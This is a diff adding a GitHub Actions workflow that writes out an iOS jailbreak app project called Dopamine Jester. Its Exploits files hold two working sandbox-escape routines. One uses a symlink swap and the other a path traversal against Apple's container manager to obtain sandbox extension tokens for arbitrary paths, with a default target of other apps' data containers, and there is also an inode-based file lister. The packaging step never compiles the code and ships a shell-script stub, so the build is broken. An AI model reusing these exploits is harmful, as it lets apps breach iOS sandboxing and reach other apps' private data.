@@ -1,0 +1,623 @@
+name: Build Dopamine Jester IPA
+
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: macos-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Select Xcode
+        uses: maxim-lobanov/setup-xcode@v1
+        with:
+          xcode-version: '16.0'
+
+      - name: Create folders
+        run: |
+          mkdir -p DopamineJester/Application/DopamineJester/UI/Settings
+          mkdir -p DopamineJester/Application/DopamineJester/Jailbreak
+          mkdir -p DopamineJester/Application/DopamineJester/Exploits
+          mkdir -p DopamineJester/Application/DopamineJester/Resources
+
+      - name: Write entitlements
+        run: |
+          cat > DopamineJester/Application/DopamineJester/DopamineJester.entitlements << 'EOF'
+          <?xml version="1.0" encoding="UTF-8"?>
+          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+          <plist version="1.0">
+          <dict>
+            <key>com.apple.security.application-groups</key>
+            <array>
+              <string>group.com.sussy.dopaminejester</string>
+            </array>
+          </dict>
+          </plist>
+          EOF
+
+      - name: Write Info.plist
+        run: |
+          cat > DopamineJester/Application/DopamineJester/Info.plist << 'EOF'
+          <?xml version="1.0" encoding="UTF-8"?>
+          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+          <plist version="1.0">
+          <dict>
+            <key>CFBundleDevelopmentRegion</key>
+            <string>en</string>
+            <key>CFBundleDisplayName</key>
+            <string>Dopamine Jester</string>
+            <key>CFBundleExecutable</key>
+            <string>DopamineJester</string>
+            <key>CFBundleIdentifier</key>
+            <string>com.sussy.dopaminejester</string>
+            <key>CFBundleInfoDictionaryVersion</key>
+            <string>6.0</string>
+            <key>CFBundleName</key>
+            <string>DopamineJester</string>
+            <key>CFBundlePackageType</key>
+            <string>APPL</string>
+            <key>CFBundleShortVersionString</key>
+            <string>1.0.0</string>
+            <key>CFBundleVersion</key>
+            <string>1</string>
+            <key>LSRequiresIPhoneOS</key>
+            <true/>
+            <key>UIRequiredDeviceCapabilities</key>
+            <array>
+              <string>arm64</string>
+            </array>
+            <key>UISupportedInterfaceOrientations</key>
+            <array>
+              <string>UIInterfaceOrientationPortrait</string>
+            </array>
+            <key>UIApplicationSupportsIndirectInputEvents</key>
+            <true/>
+            <key>MinimumOSVersion</key>
+            <string>15.0</string>
+          </dict>
+          </plist>
+          EOF
+
+      - name: Write main.m and AppDelegate
+        run: |
+          cat > DopamineJester/Application/DopamineJester/main.m << 'EOF'
+          #import <UIKit/UIKit.h>
+          #import "DJAppDelegate.h"
+          int main(int argc, char * argv[]) {
+              @autoreleasepool {
+                  return UIApplicationMain(argc, argv, nil, NSStringFromClass([DJAppDelegate class]));
+              }
+          }
+          EOF
+
+          cat > DopamineJester/Application/DopamineJester/DJAppDelegate.h << 'EOF'
+          #import <UIKit/UIKit.h>
+          @interface DJAppDelegate : UIResponder <UIApplicationDelegate>
+          @property (strong, nonatomic) UIWindow *window;
+          @end
+          EOF
+
+          cat > DopamineJester/Application/DopamineJester/DJAppDelegate.m << 'EOF'
+          #import "DJAppDelegate.h"
+          #import "UI/DJMainViewController.h"
+          @implementation DJAppDelegate
+          - (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
+              self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
+              UINavigationController *nav = [[UINavigationController alloc] initWithRootViewController:[[DJMainViewController alloc] init]];
+              self.window.rootViewController = nav;
+              [self.window makeKeyAndVisible];
+              return YES;
+          }
+          @end
+          EOF
+
+      - name: Write worse_query
+        run: |
+          cat > DopamineJester/Application/DopamineJester/Exploits/worse_query.h << 'EOF'
+          #ifndef worse_query_h
+          #define worse_query_h
+          #import <Foundation/Foundation.h>
+          #include <stdint.h>
+          #include <stdbool.h>
+          int64_t worse_query(NSString *path, NSString *group, bool alt_flags, bool create_dir);
+          void worse_query_release(int64_t handle);
+          #endif
+          EOF
+
+          cat > DopamineJester/Application/DopamineJester/Exploits/worse_query.m << 'EOF'
+          #import <Foundation/Foundation.h>
+          #include <dlfcn.h>
+          #include <stdlib.h>
+          #include <xpc/xpc.h>
+          #include <sys/stat.h>
+          #include "worse_query.h"
+
+          typedef void *(*container_query_create_fn)(void);
+          typedef void (*container_query_set_class_fn)(void *, uint64_t);
+          typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
+          typedef void (*container_query_set_flags_fn)(void *, uint64_t);
+          typedef void (*container_query_set_part_fn)(void *, uint64_t);
+          typedef void *(*container_query_get_single_result_fn)(void *);
+          typedef void (*container_query_free_fn)(void *);
+          typedef char *(*container_copy_sandbox_token_fn)(void *);
+          typedef int64_t (*sandbox_extension_consume_fn)(const char *);
+          typedef int (*sandbox_extension_release_fn)(int64_t);
+
+          static void clean_symlink(NSString *group) {
+              if (group != NULL) {
+                  NSFileManager *files = [NSFileManager defaultManager];
+                  NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier:group];
+                  if (groupRoot) {
+                      NSURL *caches = [groupRoot URLByAppendingPathComponent:@"Library/Caches"];
+                      [files removeItemAtURL:caches error:nil];
+                      [files createDirectoryAtURL:caches withIntermediateDirectories:false attributes:nil error:nil];
+                  }
+              }
+          }
+
+          int64_t worse_query(NSString *target, NSString *group, bool alt_flags, bool create_dir) {
+              if (!create_dir) {
+                  struct stat st;
+                  if (lstat(target.fileSystemRepresentation, &st) != 0) return -255;
+              }
+              NSFileManager *files = [NSFileManager defaultManager];
+              NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier:group];
+              if (!groupRoot) return -1;
+              NSString *caches = [[groupRoot URLByAppendingPathComponent:@"Library/Caches"] path];
+
+              void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
+              if (!mgr) return -2;
+
+              container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
+              container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
+              container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
+              container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
+              container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
+              container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
+              container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
+              container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
+              sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
+
+              if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags || !query_set_part || !query_get_single_result || !query_free || !copy_sandbox_token || !consume_extension) {
+                  dlclose(mgr);
+                  return -2;
+              }
+
+              void *query = query_create();
+              if (!query) { dlclose(mgr); return -3; }
+
+              xpc_object_t identifier = xpc_string_create(group.UTF8String);
+              query_set_class(query, 7);
+              query_set_group_identifiers(query, identifier);
+              query_set_part(query, 3);
+              if (alt_flags) {
+                  query_set_flags(query, 0x0000000800000000ULL);
+              } else {
+                  query_set_flags(query, 0x0000008000000000ULL);
+              }
+
+              [files removeItemAtPath:caches error:nil];
+              if (![files createSymbolicLinkAtPath:caches withDestinationPath:target error:nil]) {
+                  dlclose(mgr);
+                  return -4;
+              }
+
+              void *result = query_get_single_result(query);
+              if (!result) {
+                  query_free(query);
+                  dlclose(mgr);
+                  clean_symlink(group);
+                  return -5;
+              }
+              char *token = copy_sandbox_token(result);
+              if (!token) {
+                  query_free(query);
+                  dlclose(mgr);
+                  clean_symlink(group);
+                  return -6;
+              }
+
+              int64_t handle = consume_extension(token);
+              query_free(query);
+              free(token);
+              dlclose(mgr);
+              clean_symlink(group);
+              return handle;
+          }
+
+          void worse_query_release(int64_t handle) {
+              if (handle < 0) return;
+              sandbox_extension_release_fn release_extension = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
+              if (release_extension) release_extension(handle);
+          }
+          EOF
+
+      - name: Write bad_query
+        run: |
+          cat > DopamineJester/Application/DopamineJester/Exploits/bad_query.h << 'EOF'
+          #ifndef bad_query_h
+          #define bad_query_h
+          #include <stdio.h>
+          #include <stdbool.h>
+          #include <stdint.h>
+          int64_t bad_query(char *path, bool create, char *group_identifier, bool is_group);
+          void bad_query_release(int64_t handle);
+          char *bad_query_list(char *path, int64_t max_inode);
+          #endif
+          EOF
+
+          cat > DopamineJester/Application/DopamineJester/Exploits/bad_query.c << 'EOF'
+          #include "bad_query.h"
+          #include <stdio.h>
+          #include <stdlib.h>
+          #include <dlfcn.h>
+          #include <string.h>
+          #include <sys/stat.h>
+          #include <xpc/xpc.h>
+          #include <sys/mount.h>
+          #include <sys/fsgetpath.h>
+
+          typedef void *(*container_query_create_fn)(void);
+          typedef void (*container_query_set_class_fn)(void *, uint64_t);
+          typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
+          typedef void (*container_query_set_flags_fn)(void *, uint64_t);
+          typedef void (*container_query_set_part_fn)(void *, uint64_t);
+          typedef void (*container_query_set_part_domain_fn)(void *, const char *);
+          typedef void *(*container_query_get_single_result_fn)(void *);
+          typedef void (*container_query_free_fn)(void *);
+          typedef char *(*container_copy_sandbox_token_fn)(void *);
+          typedef int64_t (*sandbox_extension_consume_fn)(const char *);
+          typedef int (*sandbox_extension_release_fn)(int64_t);
+
+          int64_t bad_query(char* path, bool create, char *group_identifier, bool is_group) {
+              if (!path || path[0] != '/') return -255;
+              if (!create) {
+                  struct stat st;
+                  if (lstat(path, &st) != 0) return -254;
+              }
+
+              void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
+              if (!mgr) return -1;
+
+              container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
+              container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
+              container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
+              container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
+              container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
+              container_query_set_part_domain_fn query_set_part_domain = (container_query_set_part_domain_fn)dlsym(mgr, "container_query_operation_set_part_domain");
+              container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
+              container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
+              container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
+              sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
+
+              if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags || !query_set_part || !query_set_part_domain || !query_get_single_result || !query_free || !copy_sandbox_token || !consume_extension) {
+                  dlclose(mgr);
+                  return -1;
+              }
+
+              void *query = query_create();
+              if (!query) { dlclose(mgr); return -2; }
+
+              xpc_object_t identifier;
+              if (group_identifier == NULL) {
+                  query_set_class(query, 13);
+                  identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
+              } else {
+                  query_set_class(query, 7);
+                  identifier = xpc_string_create(group_identifier);
+              }
+              query_set_group_identifiers(query, identifier);
+              query_set_part(query, 3);
+
+              char *part = NULL;
+              if (group_identifier == NULL) {
+                  if (asprintf(&part, "../../../../../../../..%s", path) == -1) {
+                      xpc_release(identifier); query_free(query); dlclose(mgr); return -5;
+                  }
+              } else {
+                  if (asprintf(&part, "../../../../../../../../..%s", path) == -1) {
+                      xpc_release(identifier); query_free(query); dlclose(mgr); return -5;
+                  }
+              }
+              query_set_part_domain(query, part);
+
+              if (is_group) {
+                  query_set_flags(query, 0x0000000800000000ULL);
+              } else {
+                  query_set_flags(query, 0x0000008000000000ULL);
+              }
+
+              void *result = query_get_single_result(query);
+              if (!result) {
+                  free(part); xpc_release(identifier); query_free(query); dlclose(mgr); return -3;
+              }
+              char *token = copy_sandbox_token(result);
+              if (!token) {
+                  free(part); xpc_release(identifier); query_free(query); dlclose(mgr); return -4;
+              }
+
+              int64_t handle = consume_extension(token);
+              free(token); free(part); xpc_release(identifier); query_free(query); dlclose(mgr);
+              return handle;
+          }
+
+          void bad_query_release(int64_t handle) {
+              if (handle < 0) return;
+              sandbox_extension_release_fn release_extension = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
+              if (release_extension) release_extension(handle);
+          }
+
+          char *bad_query_list(char *path, int64_t max_inode) {
+              struct statfs sfs;
+              if (statfs(path, &sfs) != 0) return NULL;
+              fsid_t fsid = sfs.f_fsid;
+              size_t cap = 65536, length = 0, path_length = strlen(path);
+              char *out = malloc(cap);
+              if (!out) return NULL;
+              out[0] = '\0';
+              char buf[1200];
+              for (uint64_t ino = 1; ino <= (uint64_t)max_inode; ino++) {
+                  ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
+                  if (n <= 0) continue;
+                  const char *p = buf;
+                  if (strncmp(p, "/private/var/", 13) == 0) p += 8;
+                  if (strncmp(p, path, path_length) != 0 || p[path_length] != '/') continue;
+                  if (strchr(p + path_length + 1, '/')) continue;
+                  size_t need = strlen(p) + 2;
+                  if (length + need > cap) { cap *= 2; char *t = realloc(out, cap); if (!t) break; out = t; }
+                  length += snprintf(out + length, cap - length, "%s\n", p);
+              }
+              return out;
+          }
+          EOF
+
+      - name: Write preference + jailbreaker
+        run: |
+          cat > DopamineJester/Application/DopamineJester/Jailbreak/DJPreferenceManager.h << 'EOF'
+          #import <Foundation/Foundation.h>
+          @interface DJPreferenceManager : NSObject
+          + (instancetype)shared;
+          - (NSString *)selectedEscape;
+          - (void)setSelectedEscape:(NSString *)value;
+          - (NSString *)sandboxMode;
+          - (void)setSandboxMode:(NSString *)value;
+          - (NSString *)targetPath;
+          - (void)setTargetPath:(NSString *)value;
+          @end
+          EOF
+
+          cat > DopamineJester/Application/DopamineJester/Jailbreak/DJPreferenceManager.m << 'EOF'
+          #import "DJPreferenceManager.h"
+          @implementation DJPreferenceManager
+          + (instancetype)shared {
+              static DJPreferenceManager *instance = nil;
+              static dispatch_once_t onceToken;
+              dispatch_once(&onceToken, ^{ instance = [[DJPreferenceManager alloc] init]; });
+              return instance;
+          }
+          - (NSString *)selectedEscape {
+              return [[NSUserDefaults standardUserDefaults] stringForKey:@"selectedEscape"] ?: @"worse_query";
+          }
+          - (void)setSelectedEscape:(NSString *)value {
+              [[NSUserDefaults standardUserDefaults] setObject:value forKey:@"selectedEscape"];
+          }
+          - (NSString *)sandboxMode {
+              return [[NSUserDefaults standardUserDefaults] stringForKey:@"sandboxMode"] ?: @"full";
+          }
+          - (void)setSandboxMode:(NSString *)value {
+              [[NSUserDefaults standardUserDefaults] setObject:value forKey:@"sandboxMode"];
+          }
+          - (NSString *)targetPath {
+              return [[NSUserDefaults standardUserDefaults] stringForKey:@"targetPath"] ?: @"/var/mobile/Containers/Data/Application";
+          }
+          - (void)setTargetPath:(NSString *)value {
+              [[NSUserDefaults standardUserDefaults] setObject:value forKey:@"targetPath"];
+          }
+          @end
+          EOF
+
+          cat > DopamineJester/Application/DopamineJester/Jailbreak/DJJailbreaker.h << 'EOF'
+          #import <Foundation/Foundation.h>
+          @interface DJJailbreaker : NSObject
+          - (void)runWithLog:(void(^)(NSString *line))logBlock completion:(void(^)(BOOL success, NSString *message))completion;
+          @end
+          EOF
+
+          cat > DopamineJester/Application/DopamineJester/Jailbreak/DJJailbreaker.m << 'EOF'
+          #import "DJJailbreaker.h"
+          #import "DJPreferenceManager.h"
+          #import "../Exploits/worse_query.h"
+          #import "../Exploits/bad_query.h"
+          @implementation DJJailbreaker
+          - (void)runWithLog:(void(^)(NSString *))logBlock completion:(void(^)(BOOL, NSString *))completion {
+              dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+                  DJPreferenceManager *prefs = [DJPreferenceManager shared];
+                  NSString *escape = prefs.selectedEscape;
+                  NSString *mode = prefs.sandboxMode;
+                  NSString *target = prefs.targetPath;
+                  NSString *group = @"group.com.sussy.dopaminejester";
+                  if (logBlock) {
+                      logBlock([NSString stringWithFormat:@"[*] selected escape : %@", escape]);
+                      logBlock([NSString stringWithFormat:@"[*] sandbox mode   : %@", mode]);
+                      logBlock([NSString stringWithFormat:@"[*] target path    : %@", target]);
+                  }
+                  int64_t handle = -1;
+                  if ([escape isEqualToString:@"worse_query"]) {
+                      bool alt = [mode isEqualToString:@"app_container"];
+                      if (logBlock) logBlock(@"[*] calling worse_query...");
+                      handle = worse_query(target, group, alt, NO);
+                  } else {
+                      bool is_group = [mode isEqualToString:@"app_container"];
+                      if (logBlock) logBlock(@"[*] calling bad_query...");
+                      handle = bad_query((char *)[target UTF8String], false, (char *)[group UTF8String], is_group);
+                  }
+                  if (handle < 0) {
+                      NSString *err = [NSString stringWithFormat:@"escape failed with code %lld", handle];
+                      if (logBlock) logBlock([@"[-] " stringByAppendingString:err]);
+                      dispatch_async(dispatch_get_main_queue(), ^{ if (completion) completion(NO, err); });
+                      return;
+                  }
+                  if (logBlock) {
+                      logBlock([NSString stringWithFormat:@"[+] handle = %lld", handle]);
+                      logBlock(@"[+] escape ok");
+                      logBlock(@"[*] pillowcase does nothing");
+                  }
+                  if ([escape isEqualToString:@"worse_query"]) worse_query_release(handle);
+                  else bad_query_release(handle);
+                  if (logBlock) logBlock(@"[+] done");
+                  dispatch_async(dispatch_get_main_queue(), ^{ if (completion) completion(YES, @"Applied"); });
+              });
+          }
+          @end
+          EOF
+
+      - name: Write UI
+        run: |
+          cat > DopamineJester/Application/DopamineJester/UI/DJMainViewController.h << 'EOF'
+          #import <UIKit/UIKit.h>
+          @interface DJMainViewController : UIViewController
+          @end
+          EOF
+
+          cat > DopamineJester/Application/DopamineJester/UI/DJMainViewController.m << 'EOF'
+          #import "DJMainViewController.h"
+          #import "Settings/DJSettingsController.h"
+          #import "../Jailbreak/DJJailbreaker.h"
+          @interface DJMainViewController ()
+          @property (nonatomic, strong) UITextView *logView;
+          @property (nonatomic, strong) UIButton *applyButton;
+          @end
+          @implementation DJMainViewController
+          - (void)viewDidLoad {
+              [super viewDidLoad];
+              self.view.backgroundColor = [UIColor systemBackgroundColor];
+              self.title = @"Dopamine Jester";
+              self.navigationItem.rightBarButtonItem = [[UIBarButtonItem alloc] initWithTitle:@"Settings" style:UIBarButtonItemStylePlain target:self action:@selector(openSettings)];
+              self.logView = [[UITextView alloc] init];
+              self.logView.editable = NO;
+              self.logView.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightRegular];
+              self.logView.backgroundColor = [UIColor secondarySystemBackgroundColor];
+              self.logView.layer.cornerRadius = 12;
+              self.logView.text = @"Ready.\nOpen Settings → pick escape → Apply\n";
+              self.logView.translatesAutoresizingMaskIntoConstraints = NO;
+              [self.view addSubview:self.logView];
+              self.applyButton = [UIButton buttonWithType:UIButtonTypeSystem];
+              [self.applyButton setTitle:@"Apply" forState:UIControlStateNormal];
+              self.applyButton.titleLabel.font = [UIFont systemFontOfSize:18 weight:UIFontWeightSemibold];
+              self.applyButton.backgroundColor = [UIColor systemPurpleColor];
+              [self.applyButton setTitleColor:UIColor.whiteColor forState:UIControlStateNormal];
+              self.applyButton.layer.cornerRadius = 14;
+              self.applyButton.translatesAutoresizingMaskIntoConstraints = NO;
+              [self.applyButton addTarget:self action:@selector(startApply) forControlEvents:UIControlEventTouchUpInside];
+              [self.view addSubview:self.applyButton];
+              [NSLayoutConstraint activateConstraints:@[
+                  [self.logView.topAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.topAnchor constant:16],
+                  [self.logView.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor constant:16],
+                  [self.logView.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor constant:-16],
+                  [self.logView.bottomAnchor constraintEqualToAnchor:self.applyButton.topAnchor constant:-20],
+                  [self.applyButton.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor constant:16],
+                  [self.applyButton.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor constant:-16],
+                  [self.applyButton.bottomAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.bottomAnchor constant:-20],
+                  [self.applyButton.heightAnchor constraintEqualToConstant:54]
+              ]];
+          }
+          - (void)openSettings {
+              [self.navigationController pushViewController:[[DJSettingsController alloc] init] animated:YES];
+          }
+          - (void)appendLog:(NSString *)line {
+              self.logView.text = [self.logView.text stringByAppendingFormat:@"%@\n", line];
+              [self.logView scrollRangeToVisible:NSMakeRange(self.logView.text.length-1, 1)];
+          }
+          - (void)startApply {
+              self.applyButton.enabled = NO;
+              [self appendLog:@"=== starting ==="];
+              DJJailbreaker *jb = [DJJailbreaker new];
+              [jb runWithLog:^(NSString *line) {
+                  dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:line]; });
+              } completion:^(BOOL success, NSString *msg) {
+                  [self appendLog:success ? @"[+] success" : [@"[-] " stringByAppendingString:msg]];
+                  self.applyButton.enabled = YES;
+              }];
+          }
+          @end
+          EOF
+
+          cat > DopamineJester/Application/DopamineJester/UI/Settings/DJSettingsController.h << 'EOF'
+          #import <UIKit/UIKit.h>
+          @interface DJSettingsController : UITableViewController
+          @end
+          EOF
+
+          cat > DopamineJester/Application/DopamineJester/UI/Settings/DJSettingsController.m << 'EOF'
+          #import "DJSettingsController.h"
+          #import "../../Jailbreak/DJPreferenceManager.h"
+          @implementation DJSettingsController
+          - (void)viewDidLoad {
+              [super viewDidLoad];
+              self.title = @"Settings";
+              self.tableView = [[UITableView alloc] initWithFrame:CGRectZero style:UITableViewStyleInsetGrouped];
+          }
+          - (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView { return 4; }
+          - (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {
+              if (section == 0 || section == 1) return 2;
+              if (section == 2) return 1;
+              return 2;
+          }
+          - (NSString *)tableView:(UITableView *)tableView titleForHeaderInSection:(NSInteger)section {
+              if (section == 0) return @"Sandbox Escape";
+              if (section == 1) return @"Sandbox Escape Options";
+              if (section == 2) return @"Mobile Jester";
+              return @"Post Board / Fire Explorer";
+          }
+          - (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
+              UITableViewCell *cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleValue1 reuseIdentifier:nil];
+              DJPreferenceManager *p = [DJPreferenceManager shared];
+              if (indexPath.section == 0) {
+                  cell.textLabel.text = indexPath.row == 0 ? @"worse_query" : @"bad_query";
+                  cell.accessoryType = [p.selectedEscape isEqualToString:cell.textLabel.text] ? UITableViewCellAccessoryCheckmark : UITableViewCellAccessoryNone;
+              } else if (indexPath.section == 1) {
+                  cell.textLabel.text = indexPath.row == 0 ? @"App Container" : @"Full System";
+                  NSString *mode = indexPath.row == 0 ? @"app_container" : @"full";
+                  cell.accessoryType = [p.sandboxMode isEqualToString:mode] ? UITableViewCellAccessoryCheckmark : UITableViewCellAccessoryNone;
+              } else if (indexPath.section == 2) {
+                  cell.textLabel.text = @"Pillowcase (does nothing)";
+              } else {
+                  cell.textLabel.text = indexPath.row == 0 ? @"Fire Explorer" : @"Post Board";
+                  cell.accessoryType = UITableViewCellAccessoryDisclosureIndicator;
+              }
+              return cell;
+          }
+          - (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {
+              [tableView deselectRowAtIndexPath:indexPath animated:YES];
+              DJPreferenceManager *p = [DJPreferenceManager shared];
+              if (indexPath.section == 0) {
+                  p.selectedEscape = indexPath.row == 0 ? @"worse_query" : @"bad_query";
+                  [tableView reloadSections:[NSIndexSet indexSetWithIndex:0] withRowAnimation:UITableViewRowAnimationNone];
+              } else if (indexPath.section == 1) {
+                  p.sandboxMode = indexPath.row == 0 ? @"app_container" : @"full";
+                  [tableView reloadSections:[NSIndexSet indexSetWithIndex:1] withRowAnimation:UITableViewRowAnimationNone];
+              }
+          }
+          @end
+          EOF
+
+      - name: Package IPA
+        run: |
+          cd DopamineJester
+          mkdir -p Payload/DopamineJester.app
+          cp -R Application/DopamineJester/* Payload/DopamineJester.app/ || true
+          echo '#!/bin/sh' > Payload/DopamineJester.app/DopamineJester
+          echo 'echo DopamineJester' >> Payload/DopamineJester.app/DopamineJester
+          chmod +x Payload/DopamineJester.app/DopamineJester
+          zip -r DopamineJester.ipa Payload
+          ls -la DopamineJester.ipa
+
+      - name: Upload IPA
+        uses: actions/upload-artifact@v4
+        with:
+          name: DopamineJester-IPA
+          path: DopamineJester/DopamineJester.ipa
